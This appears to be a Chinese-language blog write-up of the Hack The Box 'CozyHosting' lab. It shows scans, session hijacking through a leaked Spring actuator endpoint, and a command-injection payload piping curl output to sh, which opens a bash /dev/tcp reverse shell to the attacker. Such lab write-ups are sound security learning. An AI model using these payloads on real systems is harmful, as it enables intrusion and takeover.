@@ -1,0 +1,1286 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta name="referrer" content="no-referrer">
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>CozyHosting | Someb0dy&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="SpringMisconfig,psql">
+    <meta name="description" content="UserNmap┌──(root💀kali)-[~] └─# nmap -sCV -p- -T4 10.10.11.230 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-09-02 23:13 EDT Nmap scan report for 10.10.11.230 Host is up (0.18s latency). Not shown:">
+<meta name="keywords" content="SpringMisconfig,psql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CozyHosting">
+<meta property="og:url" content="someb0dy.github.io/2023/09/10/CozyHosting/index.html">
+<meta property="og:site_name" content="Someb0dy&#39;s blog">
+<meta property="og:description" content="UserNmap┌──(root💀kali)-[~] └─# nmap -sCV -p- -T4 10.10.11.230 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-09-02 23:13 EDT Nmap scan report for 10.10.11.230 Host is up (0.18s latency). Not shown:">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693716871362-74fe7525-331a-4096-a026-52014b7156c5.png#averageHue=%23fbfbfb&clientId=u29a2d45b-6550-4&from=paste&height=366&id=uf9dc1903&originHeight=412&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=26679&status=done&style=none&taskId=u66138cde-b31f-4d0b-acc2-1a5f9516f2e&title=&width=1706.6666666666667">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693717001530-fc58cb61-b6b0-421b-ab7b-4b7e79cd2783.png#averageHue=%239e8659&clientId=u29a2d45b-6550-4&from=paste&height=617&id=u107928b1&originHeight=694&originWidth=1566&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=95164&status=done&style=none&taskId=ufe9b169a-d997-41f3-be22-cea8c9e637e&title=&width=1392">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693717040138-d186b329-e280-4413-814c-ea72d7f22740.png#averageHue=%23dadcbb&clientId=u29a2d45b-6550-4&from=paste&height=910&id=ub2b395d9&originHeight=1024&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=133749&status=done&style=none&taskId=u01596db0-6f66-45d0-8d70-2644b2a3cbd&title=&width=1706.6666666666667">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693717549317-b8f7f464-82ca-43bb-800a-2bb98a8ad860.png#averageHue=%232f2f2f&clientId=u29a2d45b-6550-4&from=paste&height=674&id=u679e6736&originHeight=758&originWidth=1265&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=149303&status=done&style=none&taskId=u1b102e92-9a11-4e19-8821-e5ea8f83f57&title=&width=1124.4444444444443">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693717564939-fc96d9a4-c6f3-4253-aa24-d4f75ad814c0.png#averageHue=%23141414&clientId=u29a2d45b-6550-4&from=paste&height=526&id=uf5181a79&originHeight=592&originWidth=1220&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=65747&status=done&style=none&taskId=u31f4f3b5-9ee6-45fa-905e-7e1884ab84f&title=&width=1084.4444444444443">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693717708151-ba9cf38b-a908-43b9-a1a2-dc1ef6dfbdc7.png#averageHue=%23262525&clientId=u29a2d45b-6550-4&from=paste&height=739&id=u5902c467&originHeight=831&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=252647&status=done&style=none&taskId=u4629b156-aa72-40ef-99d1-4d7b45724f1&title=&width=1706.6666666666667">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693718459723-1a8d5e3c-769e-4d82-965b-eb442a051e4c.png#averageHue=%23161616&clientId=u29a2d45b-6550-4&from=paste&height=827&id=ued7bd16c&originHeight=930&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=158827&status=done&style=none&taskId=u4ff4e910-9b4b-488a-a586-6930951aeb3&title=&width=1706.6666666666667">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693718847466-1293929d-e2f8-411b-b5cb-7fcca04418c8.png#averageHue=%23161616&clientId=u29a2d45b-6550-4&from=paste&height=822&id=u66e5a2ef&originHeight=925&originWidth=1915&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=195720&status=done&style=none&taskId=u3d6c3037-039a-4704-8380-8beed15f9ad&title=&width=1702.2222222222222">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693719498706-a084ea58-0184-48ba-9493-131efd61fbfc.png#averageHue=%23151515&clientId=u29a2d45b-6550-4&from=paste&height=650&id=u9d80f825&originHeight=731&originWidth=1898&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=187235&status=done&style=none&taskId=u447160e2-34de-49c5-b1e2-02463490fe7&title=&width=1687.111111111111">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693719561668-cc499538-a74f-45d1-9c7d-77f71824c47a.png#averageHue=%23fcfcfc&clientId=u29a2d45b-6550-4&from=paste&height=523&id=udd6c062b&originHeight=588&originWidth=1374&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=29252&status=done&style=none&taskId=u85061d9d-8ffa-4408-bc93-760205109cb&title=&width=1221.3333333333333">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693719973848-d7c1fa85-1fc3-4832-ad72-50b438beb51d.png#averageHue=%23f3f2f2&clientId=u29a2d45b-6550-4&from=paste&height=653&id=uc7898225&originHeight=735&originWidth=1354&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=54561&status=done&style=none&taskId=ucfbc8b18-cad1-4fef-a35e-b692b22d298&title=&width=1203.5555555555557">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693722705716-73b44569-2878-427a-a613-8ff00b94b6f6.png#averageHue=%231f2429&clientId=u29a2d45b-6550-4&from=paste&height=639&id=ud247aa8a&originHeight=719&originWidth=1105&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=60850&status=done&style=none&taskId=u413124cb-1e21-47d3-b711-319e94474be&title=&width=982.2222222222222">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693722895808-de770b7b-5f47-4a9f-809a-5d281eea2ea7.png#averageHue=%23181818&clientId=u29a2d45b-6550-4&from=paste&height=358&id=u1a7e1f77&originHeight=403&originWidth=1850&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=89573&status=done&style=none&taskId=u8e5ad797-867b-4234-a5e0-870e1d5d04d&title=&width=1644.4444444444443">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693725410807-442741cf-8a81-4a34-acb4-3c9ed06264c1.png#averageHue=%23121212&clientId=u29a2d45b-6550-4&from=paste&height=437&id=u025f2114&originHeight=492&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=71850&status=done&style=none&taskId=uc9c9a8a6-4f2b-4f3b-b96e-b81c5ded055&title=&width=1706.6666666666667">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693725591966-fa84539d-8613-4d99-9404-0be41997e4d9.png#averageHue=%23a2ce86&clientId=u29a2d45b-6550-4&from=paste&height=844&id=uf74e3a5c&originHeight=949&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=101430&status=done&style=none&taskId=u41d7202a-c8e7-470b-9a99-e56110f8435&title=&width=1706.6666666666667">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693736881632-ac1fb2aa-e32e-46eb-aa53-a61a2b2197fd.png#averageHue=%232b2b2b&clientId=u497f6918-60f2-4&from=paste&id=u439f9172&originHeight=332&originWidth=712&originalType=url&ratio=1.125&rotation=0&showTitle=false&size=9230&status=done&style=none&taskId=u39fe464b-d708-4cfd-b2ab-8da0e2927e6&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693735174880-66f72c44-bdd8-40c7-9e44-bd78e9b702bb.png#averageHue=%23f7f9fa&clientId=u29a2d45b-6550-4&from=paste&height=36&id=uf6e5be7a&originHeight=40&originWidth=773&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=2856&status=done&style=none&taskId=ub77087a3-99e5-4f87-8119-2024b50e150&title=&width=687.1111111111111">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693735309458-2999b70f-37b4-4102-8312-313c24e6d311.png#averageHue=%23131313&clientId=u29a2d45b-6550-4&from=paste&height=669&id=u78d65278&originHeight=753&originWidth=1206&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=75053&status=done&style=none&taskId=ud3927290-b6ad-488d-99b2-63df700f34c&title=&width=1072">
+<meta property="og:updated_time" content="2023-09-10T06:13:02.881Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693716871362-74fe7525-331a-4096-a026-52014b7156c5.png#averageHue=%23fbfbfb&clientId=u29a2d45b-6550-4&from=paste&height=366&id=uf9dc1903&originHeight=412&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=26679&status=done&style=none&taskId=u66138cde-b31f-4d0b-acc2-1a5f9516f2e&title=&width=1706.6666666666667">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Someb0dy</h5>
+          <a href="mailto:1362460837@qq.com" target="_blank" rel="noopener" title="1362460837@qq.com" class="mail">1362460837@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/Giraffe711" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">CozyHosting</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">CozyHosting</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2023-09-10T06:08:04.601Z" itemprop="datePublished" class="page-time">
+  2023-09-10
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/HTB/">HTB</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#User"><span class="post-toc-number">1.</span> <span class="post-toc-text">User</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#dirsearch"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">dirsearch</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sessions-路由"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">sessions 路由</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#RCE"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">RCE</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#反弹shell"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">反弹shell</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#下载-jar包"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">下载 jar包</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#postgres-数据库"><span class="post-toc-number">1.5.1.</span> <span class="post-toc-text">postgres 数据库</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#命令行连接"><span class="post-toc-number">1.5.2.</span> <span class="post-toc-text">命令行连接</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#postgres-执行命令"><span class="post-toc-number">1.5.3.</span> <span class="post-toc-text">postgres 执行命令</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#postgre-ReverseShell"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">postgre ReverseShell</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#frp-代理"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">frp 代理</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#峰回路转-爆破hash"><span class="post-toc-number">1.8.</span> <span class="post-toc-text">峰回路转-爆破hash</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#root"><span class="post-toc-number">2.</span> <span class="post-toc-text">root</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-CozyHosting"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">CozyHosting</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2023-09-10 14:08:04" datetime="2023-09-10T06:08:04.601Z"  itemprop="datePublished">2023-09-10</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/HTB/">HTB</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="User"><a href="#User" class="headerlink" title="User"></a>User</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root💀kali)-[~]
+└─# nmap -sCV -p- -T4 10.10.11.230
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-02 23:13 EDT
+Nmap scan report for 10.10.11.230
+Host is up (0.18s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
+|_  256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://cozyhosting.htb
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 663.02 seconds
+
+</code></pre>
+<pre><code class="bash">┌──(root💀kali)-[~]
+└─# vim /etc/hosts
+
+┌──(root💀kali)-[~]
+└─# tail -n 1/etc/hosts
+
+
+10.10.11.230 cozyhosting.htb
+</code></pre>
+<p>添加hosts文件</p>
+<h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><pre><code class="bash">┌──(root💀kali)-[~]
+└─# dirsearch -u http://cozyhosting.htb/ -e *
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: 2023AntCTF | HTTP method: GET | Threads: 30 | Wordlist size: 9009
+
+Output File: /root/.dirsearch/reports/cozyhosting.htb/-_23-09-03_00-03-38.txt
+
+Error Log: /root/.dirsearch/logs/errors-23-09-03_00-03-38.log
+
+Target: http://cozyhosting.htb/
+
+[00:03:39] Starting:
+[00:04:36] 200 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js
+[00:04:54] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
+[00:04:59] 400 -  435B  - /a%5c.aspx
+[00:05:03] 200 -  634B  - /actuator
+[00:05:03] 200 -    5KB - /actuator/env
+[00:05:04] 200 -  491B  - /actuator/sessions
+[00:05:04] 200 -   10KB - /actuator/mappings
+[00:05:04] 200 -  124KB - /actuator/beans
+[00:05:05] 200 -   15B  - /actuator/health
+[00:05:06] 401 -   97B  - /admin
+[00:06:20] 200 -    0B  - /engine/classes/swfupload//swfupload.swf
+[00:06:20] 200 -    0B  - /engine/classes/swfupload//swfupload_f9.swf
+[00:06:21] 500 -   73B  - /error
+[00:06:23] 200 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/
+[00:06:24] 200 -    0B  - /extjs/resources//charts.swf
+[00:06:35] 200 -    0B  - /html/js/misc/swfupload//swfupload.swf
+[00:06:40] 200 -   12KB - /index
+[00:06:54] 200 -    4KB - /login
+[00:06:56] 200 -    0B  - /login.wdm%2e
+[00:06:57] 204 -    0B  - /logout
+[00:07:49] 400 -  435B  - /servlet/%C0%AE%C0%AE%C0%AF
+
+Task Completed
+</code></pre>
+<p>扫出来actuator ，估计就是spring 的后端了，- -好像hvv</p>
+<h2 id="sessions-路由"><a href="#sessions-路由" class="headerlink" title="sessions 路由"></a>sessions 路由</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693716871362-74fe7525-331a-4096-a026-52014b7156c5.png#averageHue=%23fbfbfb&clientId=u29a2d45b-6550-4&from=paste&height=366&id=uf9dc1903&originHeight=412&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=26679&status=done&style=none&taskId=u66138cde-b31f-4d0b-acc2-1a5f9516f2e&title=&width=1706.6666666666667" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<pre><code class="bash">{&quot;7C923705DC41E61F208F884C9805BC62&quot;:&quot;kanderson&quot;,&quot;AA2A1070790E1763E151787985056C0F&quot;:&quot;UNAUTHORIZED&quot;,&quot;5DE00C9CFCA66C41B19981C5D42C50E3&quot;:&quot;UNAUTHORIZED&quot;,&quot;F0F29E7C3878F0FFE9B04832DDCE7B82&quot;:&quot;admin&quot;,&quot;C5DBD5957CEF28CA7D3C9B6FB720B903&quot;:&quot;UNAUTHORIZED&quot;,&quot;47A5DDA1275C3F7A737169C2351950F1&quot;:&quot;UNAUTHORIZED&quot;,&quot;B1BEAEE50493C63D8CD608EDAE5E8EC6&quot;:&quot;UNAUTHORIZED&quot;,&quot;A71AEF86230669736013CAFEFF8EC720&quot;:&quot;UNAUTHORIZED&quot;,&quot;D57F20FDBD896308C1AF0F1DC5207362&quot;:&quot;UNAUTHORIZED&quot;,&quot;709E6B96390700BFEDDCC946C0358538&quot;:&quot;kanderson&quot;}
+</code></pre>
+<p>看了一下格式就是，前面是sessions的值，如果后面不是UNAUTHORIZED,就表示这个session是有效的</p>
+<table>
+<thead>
+<tr>
+<th>username</th>
+<th>sessions</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>kanderson</td>
+<td>7C923705DC41E61F208F884C9805BC62</td>
+</tr>
+<tr>
+<td>admin</td>
+<td>F0F29E7C3878F0FFE9B04832DDCE7B82</td>
+</tr>
+<tr>
+<td>kanderson</td>
+<td>709E6B96390700BFEDDCC946C0358538</td>
+</tr>
+</tbody></table>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693717001530-fc58cb61-b6b0-421b-ab7b-4b7e79cd2783.png#averageHue=%239e8659&clientId=u29a2d45b-6550-4&from=paste&height=617&id=u107928b1&originHeight=694&originWidth=1566&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=95164&status=done&style=none&taskId=ufe9b169a-d997-41f3-be22-cea8c9e637e&title=&width=1392" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>拦截一个请求，把session替换成 kanderson 看看效果</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693717040138-d186b329-e280-4413-814c-ea72d7f22740.png#averageHue=%23dadcbb&clientId=u29a2d45b-6550-4&from=paste&height=910&id=ub2b395d9&originHeight=1024&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=133749&status=done&style=none&taskId=u01596db0-6f66-45d0-8d70-2644b2a3cbd&title=&width=1706.6666666666667" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693717549317-b8f7f464-82ca-43bb-800a-2bb98a8ad860.png#averageHue=%232f2f2f&clientId=u29a2d45b-6550-4&from=paste&height=674&id=u679e6736&originHeight=758&originWidth=1265&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=149303&status=done&style=none&taskId=u1b102e92-9a11-4e19-8821-e5ea8f83f57&title=&width=1124.4444444444443" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693717564939-fc96d9a4-c6f3-4253-aa24-d4f75ad814c0.png#averageHue=%23141414&clientId=u29a2d45b-6550-4&from=paste&height=526&id=uf5181a79&originHeight=592&originWidth=1220&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=65747&status=done&style=none&taskId=u31f4f3b5-9ee6-45fa-905e-7e1884ab84f&title=&width=1084.4444444444443" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>成功收到了请求</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693717708151-ba9cf38b-a908-43b9-a1a2-dc1ef6dfbdc7.png#averageHue=%23262525&clientId=u29a2d45b-6550-4&from=paste&height=739&id=u5902c467&originHeight=831&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=252647&status=done&style=none&taskId=u4629b156-aa72-40ef-99d1-4d7b45724f1&title=&width=1706.6666666666667" alt="image.png"><br>请求成功</p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><pre><code class="bash">┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/CozyHosting]
+└─# cat 1@1
+bash -c &quot;bash -i&gt;&amp; /dev/tcp/10.10.16.8/5555 0&gt;&amp;1&quot;
+                                                                              
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/CozyHosting]
+└─# python3 -m http.server  80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.230 - - [03/Sep/2023 01:15:32] &quot;GET /1 HTTP/1.1&quot; 200 -
+10.10.11.230 - - [03/Sep/2023 01:15:44] code 404, message File not found
+10.10.11.230 - - [03/Sep/2023 01:15:44] &quot;GET /1@a HTTP/1.1&quot; 404 -
+10.10.11.230 - - [03/Sep/2023 01:17:21] &quot;GET /1 HTTP/1.1&quot; 200 -
+10.10.11.230 - - [03/Sep/2023 01:17:44] &quot;GET /1 HTTP/1.1&quot; 200 -
+</code></pre>
+<pre><code class="http">POST /executessh HTTP/1.1
+Host: cozyhosting.htb
+Content-Length: 59
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://cozyhosting.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://cozyhosting.htb/admin?error=Invalid%20hostname!
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: JSESSIONID=AFECAAC1BC4B3E43937EAA0E5CE83F9C
+Connection: close
+
+host=1&amp;username=kanderson||curl$IFS$9http://10.10.16.8/1|sh
+
+HTTP/1.1 302 
+Server: nginx/1.18.0 (Ubuntu)
+Date: Sun, 03 Sep 2023 05:17:21 GMT
+Content-Length: 0
+Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname kanderson: Temporary failure in name resolution/bin/bash: line 1: sh@1: command not found  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100    50  100    50    0     0    151      0 --:--:-- --:--:-- --:--:--   151curl: (23) Failed writing body
+Connection: close
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 0
+Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+Pragma: no-cache
+Expires: 0
+X-Frame-Options: DENY
+</code></pre>
+<p>这里这样发包，发现 sh@1，也就是会把host的内容拼接到 username 后面去，然后再执行，我们有什么办法让后面的内容不影响我们想要执行的命令呢？<br><code>curl$IFS$9http://10.10.16.8/1|sh</code><br>答案就是再加%0a</p>
+<pre><code class="http">POST /executessh HTTP/1.1
+Host: cozyhosting.htb
+Content-Length: 62
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://cozyhosting.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://cozyhosting.htb/admin?error=Invalid%20hostname!
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: JSESSIONID=AFECAAC1BC4B3E43937EAA0E5CE83F9C
+Connection: close
+
+host=1&amp;username=kanderson||curl$IFS$9http://10.10.16.8/1|sh%0a
+</code></pre>
+<pre><code class="bash">┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/CozyHosting]
+└─# nc -lvnp 5555                                                        1 ⨯
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::5555
+Ncat: Listening on 0.0.0.0:5555
+ls
+Ncat: Connection from 10.10.11.230.
+Ncat: Connection from 10.10.11.230:46926.
+bash: cannot set terminal process group (1061): Inappropriate ioctl for device
+bash: no job control in this shell
+app@cozyhosting:/app$ ls
+cloudhosting-0.0.1.jar
+app@cozyhosting:/app$ ls
+ls
+cloudhosting-0.0.1.jar
+app@cozyhosting:/app$
+</code></pre>
+<p>成功反弹shell</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
